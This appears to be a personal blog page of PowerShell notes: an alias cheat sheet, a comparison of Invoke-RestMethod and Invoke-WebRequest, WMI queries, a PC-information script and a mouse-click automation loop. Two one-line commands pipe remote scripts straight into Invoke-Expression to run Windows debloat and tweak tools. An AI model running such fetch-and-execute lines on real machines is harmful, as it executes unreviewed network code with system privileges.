</tr>
<tr>
<td><strong>模型</strong></td>
<td><strong>Module</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gmo</td>
<td>Get-Module</td>
<td></td>
</tr>
<tr>
<td>ipmo</td>
<td>Import-Module</td>
<td></td>
</tr>
<tr>
<td>nmo</td>
<td>New-Module</td>
<td></td>
</tr>
<tr>
<td>rmo</td>
<td>Remove-Module</td>
<td></td>
</tr>
<tr>
<td><strong>比較</strong></td>
<td><strong>Compare</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>diff 👙</td>
<td>Compare-Object</td>
<td>例：<code class="notranslate">$list1 = 1..5 $list2 = 2..6 Compare-Object -ReferenceObject $list1 -DifferenceObject $list2</code>  比较两个数字列表的不同之处</td>
</tr>
<tr>
<td>compare 👙</td>
<td>Compare-Object</td>
<td>同上</td>
</tr>
<tr>
<td><strong>屏幕</strong></td>
<td><strong>Host</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>write 👙</td>
<td>Write-Output</td>
<td>例：<code class="notranslate">Write-Host "Hello, world!"</code>  输出 Hello, world!</td>
</tr>
<tr>
<td>echo 👙</td>
<td>Write-Output</td>
<td>同上</td>
</tr>
<tr>
<td>clear 👙</td>
<td>Clear-Host</td>
<td>清除控制台屏幕</td>
</tr>
<tr>
<td>cls 👙</td>
<td>Clear-Host</td>
<td>同上</td>
</tr>
<tr>
<td><strong>屏幕记录</strong></td>
<td><strong>History</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>clhy</td>
<td>Clear-History</td>
<td></td>
</tr>
<tr>
<td>ghy</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>h</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>history</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>ihy</td>
<td>Invoke-History</td>
<td></td>
</tr>
<tr>
<td>r</td>
<td>Invoke-History</td>
<td></td>
</tr>
<tr>
<td><strong>进程</strong></td>
<td><strong>Process</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>ps 👙</td>
<td>Get-Process</td>
<td>获取所有运行中的进程　`ps</td>
</tr>
<tr>
<td>gps</td>
<td>Get-Process</td>
<td>同上</td>
</tr>
<tr>
<td>start</td>
<td>Start-Process</td>
<td>例：<code class="notranslate">Start-Process notepad</code>  启动记事本应用程序</td>
</tr>
<tr>
<td>saps</td>
<td>Start-Process</td>
<td>同上</td>
</tr>
<tr>
<td>kill</td>
<td>Stop-Process</td>
<td>例：<code class="notranslate">Stop-Process -Name notepad</code>  终止所有名为 notepad 的进程</td>
</tr>
<tr>
<td>spps</td>
<td>Stop-Process</td>
<td>同上</td>
</tr>
<tr>
<td><strong>服务</strong></td>
<td><strong>Service</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gsv 👙</td>
<td>Get-Service</td>
<td>获取所有服务的状态</td>
</tr>
<tr>
<td>sasv</td>
<td>Start-Service</td>
<td>例：<code class="notranslate">Start-Service -Name spooler</code>  启动 Print Spooler 服务</td>
</tr>
<tr>
<td>spsv</td>
<td>Stop-Service</td>
<td>例：<code class="notranslate">Stop-Service -Name spooler</code>  停止 Print Spooler 服务</td>
</tr>
<tr>
<td>ー</td>
<td>Restart-Service</td>
<td>例：<code class="notranslate">Restart-Service -Name spooler</code>  重启 Print Spooler 服务</td>
</tr>
<tr>
<td><strong>任務</strong></td>
<td><strong>Job</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gjb 👙</td>
<td>Get-Job</td>
<td></td>
</tr>
<tr>
<td>sajb</td>
<td>Start-Job</td>
<td></td>
</tr>
<tr>
<td>spjb</td>
<td>Stop-Job</td>
<td></td>
</tr>
<tr>
<td>wjb</td>
<td>Wait-Job</td>
<td></td>
</tr>
<tr>
<td>rjb</td>
<td>Remove-Job</td>
<td></td>
</tr>
<tr>
<td>rcjb</td>
<td>Receive-Job</td>
<td></td>
</tr>
<tr>
<td>rujb</td>
<td>Resume-Job</td>
<td></td>
</tr>
<tr>
<td>sujb</td>
<td>Suspend-Job</td>
<td></td>
</tr>
<tr>
<td><strong>文件操作</strong></td>
<td><strong>Content</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>cat 👙</td>
<td>Get-Content</td>
<td>例：<code class="notranslate">$content = Get-Content -Path "C:\temp\input.txt"</code>  读取文件内容</td>
</tr>
<tr>
<td>type 👙</td>
<td>Get-Content</td>
<td>同上</td>
</tr>
<tr>
<td>gc</td>
<td>Get-Content</td>
<td>同上</td>
</tr>
<tr>
<td>sc</td>
<td>Set-Content</td>
<td>例：<code class="notranslate">"Hello, world!" | Set-Content -Path "C:\temp\output.txt"</code>  写入文件内容</td>
</tr>
<tr>
<td>ac</td>
<td>Add-Content</td>
<td>例：<code class="notranslate">"Another line" | Add-Content -Path "C:\temp\output.txt"</code> 添加文件内容</td>
</tr>
<tr>
<td>clc</td>
<td>Clear-Content</td>
<td></td>
</tr>
<tr>
<td><strong>CSV操作</strong></td>
<td><strong>CSV</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>ipcsv</td>
<td>Import-Csv</td>
<td>例：<code class="notranslate">$data = Import-Csv -Path "C:\temp\data.csv"</code>  从 CSV 文件导入数据</td>
</tr>
<tr>
<td>epcsv</td>
<td>Export-Csv</td>
<td>例：<code class="notranslate">$data | Export-Csv -Path "C:\temp\output.csv" -NoTypeInformatio</code>  将数据导出为 CSV 文件</td>
</tr>
<tr>
<td><strong>网络请求</strong></td>
<td><strong>WebRequest</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>wget 👙</td>
<td>Invoke-WebRequest</td>
<td>例：<code class="notranslate">Invoke-WebRequest "https://api.github.com/repos/powershell/powershell/releases/latest"</code>  获取 GitHub 上最新发布的版本信息</td>
</tr>
<tr>
<td>curl 👙</td>
<td>Invoke-WebRequest</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4</a></td>
</tr>
<tr>
<td>irm👙</td>
<td>Invoke-RestMethod　XMLやJSON扱いやすい</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.4</a></td>
</tr>
<tr>
<td>iex 👙</td>
<td>Invoke-Expression</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4</a></td>
</tr>
<tr>
<td>iwr</td>
<td>Invoke-WebRequest</td>
<td>同上</td>
</tr>
<tr>
<td><strong>剪贴板</strong></td>
<td><strong>Clipboard</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gcb</td>
<td>Get-Clipboard</td>
<td></td>
</tr>
<tr>
<td>scb</td>
<td>Set-Clipboard</td>
<td></td>
</tr>
<tr>
<td><strong>时间地域</strong></td>
<td><strong>TimeZone</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gtz</td>
<td>Get-TimeZone</td>
<td></td>
</tr>
<tr>
<td>stz</td>
<td>Set-TimeZone</td>
<td></td>
</tr>
<tr>
<td><strong>Session</strong></td>
<td><strong>PSSession</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>cnsn</td>
<td>Connect-PSSession</td>
<td></td>
</tr>
<tr>
<td>dnsn</td>
<td>Disconnect-PSSession</td>
<td></td>
</tr>
<tr>
<td>epsn</td>
<td>Export-PSSession</td>
<td></td>
</tr>
<tr>
<td>etsn</td>
<td>Enter-PSSession</td>
<td></td>
</tr>
<tr>
<td>exsn</td>
<td>Exit-PSSession</td>
<td></td>
</tr>
<tr>
<td>gsn</td>
<td>Get-PSSession</td>
<td></td>
</tr>
<tr>
<td>ipsn</td>
<td>Import-PSSession</td>
<td></td>
</tr>
<tr>
<td>rcsn</td>
<td>Receive-PSSession</td>
<td></td>
</tr>
<tr>
<td>rsn</td>
<td>Remove-PSSession</td>
<td></td>
</tr>
<tr>
<td>nsn</td>
<td>New-PSSession</td>
<td></td>
</tr>
<tr>
<td>npssc</td>
<td>New-PSSessionConfigur</td>
<td></td>
</tr>
<tr>
<td><strong>Breakpoint</strong></td>
<td><strong>PSBreakpoint</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>dbp</td>
<td>Disable-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>ebp</td>
<td>Enable-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>gbp</td>
<td>Get-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>sbp</td>
<td>Set-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>rbp</td>
<td>Remove-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td><strong>Snapin</strong></td>
<td><strong>PSSnapin</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gsnp</td>
<td>Get-PSSnapin</td>
<td></td>
</tr>
<tr>
<td>asnp</td>
<td>Add-PSSnapin</td>
<td></td>
</tr>
<tr>
<td>rsnp</td>
<td>Remove-PSSnapin</td>
<td></td>
</tr>
<tr>
<td><strong>その他</strong></td>
<td><strong>Others</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>man 👙</td>
<td>help</td>
<td>例：<code class="notranslate">Get-Help Get-Process</code>  获取 Get-Process 的帮助文档</td>
</tr>
<tr>
<td>ise</td>
<td>powershell_ise.exe</td>
<td></td>
</tr>
<tr>
<td>CFS</td>
<td>ConvertFrom-String</td>
<td></td>
</tr>
<tr>
<td>cvpa</td>
<td>Convert-Path</td>
<td></td>
</tr>
<tr>
<td>fc</td>
<td>Format-Custom</td>
<td></td>
</tr>
<tr>
<td>fhx</td>
<td>Format-Hex</td>
<td></td>
</tr>
<tr>
<td>fl</td>
<td>Format-List</td>
<td></td>
</tr>
<tr>
<td>ft</td>
<td>Format-Table</td>
<td></td>
</tr>
<tr>
<td>fw</td>
<td>Format-Wide</td>
<td></td>
</tr>
<tr>
<td>gcs</td>
<td>Get-PSCallStack</td>
<td></td>
</tr>
<tr>
<td>gin 👙</td>
<td>Get-ComputerInfo</td>
<td></td>
</tr>
<tr>
<td>gm</td>
<td>Get-Member</td>
<td></td>
</tr>
<tr>
<td>gu</td>
<td>Get-Unique</td>
<td></td>
</tr>
<tr>
<td>iwmi</td>
<td>Invoke-WmiMethod</td>
<td></td>
</tr>
<tr>
<td>lp</td>
<td>Out-Printer</td>
<td></td>
</tr>
<tr>
<td>ogv</td>
<td>Out-GridView</td>
<td></td>
</tr>
<tr>
<td>oh</td>
<td>Out-Host</td>
<td></td>
</tr>
<tr>
<td>rvpa</td>
<td>Resolve-Path</td>
<td></td>
</tr>
<tr>
<td>sleep</td>
<td>Start-Sleep</td>
<td></td>
</tr>
<tr>
<td>sls</td>
<td>Select-String</td>
<td>例：<code class="notranslate">Select-String -Path "C:\temp\log.txt" -Pattern "error"</code>  在日志文件中搜索含有 "error" 的行</td>
</tr>
<tr>
<td>swmi</td>
<td>Set-WmiInstance</td>
<td>在 WMI 中创建或修改实例</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h2>Invoke-RestMethod与 Invoke-WebRequest的区别</h2>
<pre class="notranslate"><code class="notranslate">$RestMethod = Invoke-RestMethod "https://yesno.wtf/api"
$RestMethod
answer forced image
------ ------ -----
yes     False https://yesno.wtf/assets/yes/2-5df1b403f2654fa77559af1bf2332d7a.gif

$rest.answer
yes

</code></pre>
<pre class="notranslate"><code class="notranslate">$WebRequest = Invoke-WebRequest "https://yesno.wtf/api"
$WebRequest
StatusCode        : 200
StatusDescription : OK
Content           : {"answer":"yes","forced":false,"image":"https://yesno.wtf/assets/yes/1-af11222d8d4af90bdab8fc447c8cfe
                    bf.gif"}
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Status: 200 OK
                    Cache-Control: must-revalidate, max-age=0, private
                    Access-Control-Allow-Origin: *
                    ETag: "d5d1109b6aaeee4be8ce60e5846156…
Headers           : {[Transfer-Encoding, System.String[]], [Connection, System.String[]], [Status, System.String[]], [Cac
                    he-Control, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 109
RelationLink      : {}

$hoge = ConvertFrom-Json $web
$hoge.answer
yes
</code></pre>
<p>前者（RestMethod）は PowerShell 特有の PSObject という形ですね。<br>
後者（WebRequest）はこのコマンドレット特有のものですね。</p>
<p>RestMethod のほうが XML や JSON を扱いやすい</p>
<p>単純に手間が一つ少ないというだけではありますが、Json を扱うなら RestMethod が良さそうですね。<br>
また、構造としてはどちらも同じらしく、出力のデータ形式が異なる以外の相違点はないそうです。</p>
<h2>删除Windows内置app <a href="https://github.com/raphire/win11debloat/">win11debloat</a></h2>
<pre class="notranslate"><code class="notranslate">irm "https://win11debloat.raphi.re/" | iex
</code></pre>
<h2>修改Win设置 <a href="https://github.com/ChrisTitusTech/winutil/">ChrisTitusTech/winutil</a></h2>
<pre class="notranslate"><code class="notranslate">irm "https://christitus.com/win" | iex
</code></pre>
<h2>PowerShellでWMIクラスの一覧を取得</h2>
<pre class="notranslate"><code class="notranslate">Get-WmiObject -list | Sort-Object
</code></pre>
<h2>WMIオブジェクトを検索することができます</h2>
<pre class="notranslate"><code class="notranslate">Get-WmiObject -list | Select-String キーワード
例：Get-WmiObject -list | Select-String Win32_Disk
　　Get-WmiObject -list | Select-String Win32_System
　　Get-WmiObject -list | Select-String Win32_Oper
</code></pre>
<hr>
<h2>示例：获取本地PC的信息（保存为<code class="notranslate">getPCInfo.ps1</code>）</h2>
<pre class="notranslate"><code class="notranslate">function global:getPCInfo ($pcname) {
    if ($pcname -eq $null) {
        $pcname = 'localhost'
    }

    $ErrorActionPreference = "silentlycontinue"
    $outputString = ""

    if (Test-Connection $pcname -count 1) {
        $outputString += "====================================================`n"
        $outputString += $pcname + "`n"
        $outputString += "--------------------------`n"
        
        $ComputerSystem = Get-WmiObject Win32_ComputerSystem -computername $pcname

        # ComputerName
        $outputString += ("ComputerName   : " + $ComputerSystem.Name + "`n")

        # IPAddress
        $IPAddressArray = (Get-WmiObject Win32_NetworkAdapterConfiguration -computername $pcname).IPAddress
        $IPAddress = ""
        foreach ($ip in $IPAddressArray) {
            if ($ip -ne $null){
                $IPAddress = $ip
            }
        }
        $outputString += ("IPAddress      : " + $IPAddress + "`n")
        
        # Model
        $outputString += ("Model          : " + $ComputerSystem.Model + "`n")

        # BaseBoard
        $BaseBoard = Get-WmiObject Win32_BaseBoard -computername $pcname
        $outputString += ("MotherBoard    : " + $BaseBoard.Manufacturer + " " + $BaseBoard.Product + "`n")

        # OS
        $OS = Get-WmiObject Win32_OperatingSystem -computername $pcname
        $outputString += ("OS             : " + $OS.Caption + "`n")

        # CPU
        $Processor = Get-WmiObject Win32_Processor -computername $pcname
        if ($Processor.GetType().Name -eq "Object[]"){
            $Processor = $Processor[0]
        }
        $outputString += ("CPU            : " + $Processor.Name + "`n")
        
        # RAM
        $Capacitys = (Get-WmiObject Win32_PhysicalMemory -computername $pcname).Capacity
        for ($i = 0; $i -lt $Capacitys.length; $i++) {
            $Capacitys[$i] = [string][int]($Capacitys[$i]/1GB)
        }
        $TotalPhysicalMemory = [int]($ComputerSystem.TotalPhysicalMemory/1GB)
        $outputString += ("RAM            : " + $TotalPhysicalMemory + " GB [" + ($Capacitys -join "/") + "]`n")
        
        # VideoController
        $VideoController = Get-WmiObject Win32_VideoController -computername $pcname
        
        if ($VideoController.GetType().Name -ne "Object[]"){
            $VideoController = @($VideoController)
        }
        
        $outputString += ("VideoController:`n")
        for ($i = 0; $i -lt $VideoController.length; $i++) {
            $outputString += ("    " + $VideoController[$i].Name + "  [" + $VideoController[$i].CurrentHorizontalResolution + " x " + $VideoController[$i].CurrentVerticalResolution + "]`n")
        }
        
        # NetworkAdapter
        $NetworkAdapterNames = (Get-WmiObject Win32_NetworkAdapter -Filter "NetConnectionStatus = 2" -computername $pcname).Name
        if ($NetworkAdapterNames.GetType().Name -ne "Object[]"){
            $NetworkAdapterNames = @($NetworkAdapterNames)
        }
        $outputString += "NetworkAdapter :`n"
        foreach ($n in $NetworkAdapterNames) {
            $outputString += ("    " + $n + "`n")
        }
        
        # LogicalDisk
        $LocalDisk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType = 3" -computername $pcname
        
        if ($LocalDisk.GetType().Name -ne "Object[]"){
            $LocalDisk = @($LocalDisk)
        }

        $outputString += "LocalDisk      :`n"
        $disks = $LocalDisk
        for ($i = 0; $i -lt $LocalDisk.length; $i++) {
            $outputString += ("    " + $LocalDisk[$i].DeviceID + " " + [int]($LocalDisk[$i].Size/1GB) + " GB [FreeSpace:" + [int]($LocalDisk[$i].FreeSpace/1GB) + " GB]`n")
            $disks[$i] = ($LocalDisk[$i].DeviceID + " " + [int]($LocalDisk[$i].Size/1GB) + " GB [Free:" + [int]($LocalDisk[$i].FreeSpace/1GB) + " GB]")
        }
    } else {
        $outputString += "====================================================`n"
        $outputString += ($pcname + " not responding...`n")
    }
    
    echo $outputString
    $ErrorActionPreference = "continue"
}
</code></pre>
<p>调用：</p>
<pre class="notranslate"><code class="notranslate">$ .\getPCInfo.ps1

// localhost
$ getPCInfo

// network
$ getPCInfo &lt;computername&gt;
</code></pre>
<p>结果：</p>
<pre class="notranslate"><code class="notranslate">====================================================
localhost
--------------------------
ComputerName   : COMPUTERNAME
IPAddress      : XXX.XXX.XXX.XXX
Model          : B460M
MotherBoard    : MouseComputer B460M
OS             : Microsoft Windows 11 Home
CPU            : Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz
RAM            : 16 GB [8/8]
VideoController:
    NVIDIA GeForce RTX 3060  [1920 x 1200]
NetworkAdapter :
    Intel(R) Ethernet Connection (12) I219-V
LocalDisk      :
    C: 476 GB [FreeSpace:88 GB]
    D: 1863 GB [FreeSpace:1151 GB]
</code></pre>
<h2>Powershell 控制鼠标移动</h2>
<pre class="notranslate"><code class="notranslate"># .NET Frameworkの宣言
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 

# Windows APIの宣言
$signature=@'
[DllImport("user32.dll",CharSet=CharSet.Auto,CallingConvention=CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
'@
$SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventNew" -namespace Win32Functions -passThru

while ($true) {

    # マウスカーソル移動
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(627, 379)
    # 左クリック
    $SendMouseClick::mouse_event(0x0002, 0, 0, 0, 0);
    $SendMouseClick::mouse_event(0x0004, 0, 0, 0, 0);
    Start-Sleep -s 3

    # マウスカーソル移動
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(859, 194)
    # 左クリック
    $SendMouseClick::mouse_event(0x0002, 0, 0, 0, 0);
    $SendMouseClick::mouse_event(0x0004, 0, 0, 0, 0);
    Start-Sleep -s 3
}
</code></pre>
<h2>Windows特殊文件夹</h2>
<ul>
<li>System.Environmentを使って特殊フォルダ一覧リストを出力</li>
</ul>
<pre class="notranslate"><code class="notranslate">[Environment+SpecialFolder]::GetNames([Environment+SpecialFolder]) | Sort-Object

↓↓特殊フォルダの一覧
AdminTools
ApplicationData
CDBurning
CommonAdminTools
CommonApplicationData
CommonDesktopDirectory
CommonDocuments
CommonMusic
CommonOemLinks
CommonPictures
CommonProgramFiles
CommonProgramFilesX86
CommonPrograms
CommonStartMenu
CommonStartup
CommonTemplates
CommonVideos
Cookies
Desktop
DesktopDirectory
Favorites
Fonts
History
InternetCache
LocalApplicationData
LocalizedResources
MyComputer
MyDocuments
MyMusic
MyPictures
MyVideos
NetworkShortcuts
Personal
PrinterShortcuts
ProgramFiles
ProgramFilesX86
Programs
Recent
Resources
SendTo
StartMenu
Startup
System
SystemX86
Templates
UserProfile
Windows
</code></pre>
<ul>
<li>各特殊フォルダのパスの取得方法は、Enviroment.GetFolderPath() メソッドを使用</li>
</ul>
<pre class="notranslate"><code class="notranslate">[Environment]::GetFolderPath("Desktop")
&gt; C:\Users\xyz\Desktop

[Environment]::GetFolderPath("AdminTools")
&gt; C:\Users\xyz\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools

[Environment]::GetFolderPath("ProgramFiles")
&gt; C:\Program Files (x86)
</code></pre>
<ul>
<li>特殊フォルダのパス一覧を出力</li>
</ul>
<pre class="notranslate"><code class="notranslate">$SpecialFolders = @{}
$names = [Environment+SpecialFolder]::GetNames([Environment+SpecialFolder]) | Sort-Object
$names | Format-Table

foreach($name in $names)
{
  if($path = [Environment]::GetFolderPath($name)){
    $SpecialFolders[$name] = $path
  }
}
$SpecialFolders | Format-Table

# ↓↓パス一覧
Name                           Value
----                           -----
System                         C:\WINDOWS\system32
CommonApplicationData          C:\ProgramData
CommonVideos                   C:\Users\Public\Videos
CDBurning                      C:\Users\win11\AppData\Local\Microsoft\Windows\Burn\Burn
MyVideos                       C:\Users\win11\Videos
ProgramFilesX86                C:\Program Files (x86)
AdminTools                     C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools
History                        C:\Users\win11\AppData\Local\Microsoft\Windows\History
CommonDocuments                C:\Users\Public\Documents
Templates                      C:\Users\win11\AppData\Roaming\Microsoft\Windows\Templates
CommonDesktopDirectory         C:\Users\Public\Desktop
UserProfile                    C:\Users\win11
Startup                        C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
InternetCache                  C:\Users\win11\AppData\Local\Microsoft\Windows\INetCache
SystemX86                      C:\WINDOWS\SysWOW64
CommonStartMenu                C:\ProgramData\Microsoft\Windows\Start Menu
MyPictures                     C:\Users\win11\Pictures
Recent                         C:\Users\win11\AppData\Roaming\Microsoft\Windows\Recent
Fonts                          C:\WINDOWS\Fonts
SendTo                         C:\Users\win11\AppData\Roaming\Microsoft\Windows\SendTo
CommonProgramFiles             C:\Program Files\Common Files
ProgramFiles                   C:\Program Files
Favorites                      C:\Users\win11\Favorites
CommonStartup                  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
Windows                        C:\WINDOWS
DesktopDirectory               C:\Users\win11\Desktop
LocalizedResources             C:\WINDOWS
MyMusic                        C:\Users\win11\Music
ApplicationData                C:\Users\win11\AppData\Roaming
CommonPictures                 C:\Users\Public\Pictures
CommonPrograms                 C:\ProgramData\Microsoft\Windows\Start Menu\Programs
Desktop                        C:\Users\win11\Desktop
PrinterShortcuts               C:\Users\win11\AppData\Roaming\Microsoft\Windows\Printer Shortcuts
CommonAdminTools               C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools
NetworkShortcuts               C:\Users\win11\AppData\Roaming\Microsoft\Windows\Network Shortcuts
CommonMusic                    C:\Users\Public\Music
CommonProgramFilesX86          C:\Program Files (x86)\Common Files
Programs                       C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
Resources                      C:\WINDOWS\resources
MyComputer                     C:\WINDOWS
CommonTemplates                C:\ProgramData\Microsoft\Windows\Templates
CommonOemLinks                 C:\WINDOWS
MyDocuments                    C:\Users\win11\Documents
StartMenu                      C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu
Cookies                        C:\Users\win11\AppData\Local\Microsoft\Windows\INetCookies
LocalApplicationData           C:\Users\win11\AppData\Local
Personal                       C:\Users\win11\Documents
</code></pre></div>
<div style="font-size:small;margin-top:8px;float:right;">❤️ 转载文章请注明出处，谢谢！❤️</div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://grapehut.xyz">小饅頭の部落格</a> All Rights Reserved. </div>
<div id="footer2"><span id="filingNum"><a href="https://beian.miit.gov.cn/" target="_blank"><a href='https://icp.gov.moe/?keyword=20241189' target='_blank'>萌ICP备20241189号</a></a> • </span>
    <span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a></span><br>
    <span id="runday"></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML= now.getFullYear();

if("08/31/2024"!=""){
    var startSite=new Date("08/31/2024");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script>

<script src='../assets/RonanTheme.js'></script><script src='../assets/GmeekVercount.js'><script src='https://app.rybbit.io/api/script.js' data-site-id='1684' defer></script></script><script async src='https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9661896697976587' crossorigin='anonymous'></script>




    <script src='../assets/sakuraPlus.js'></script>


</div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 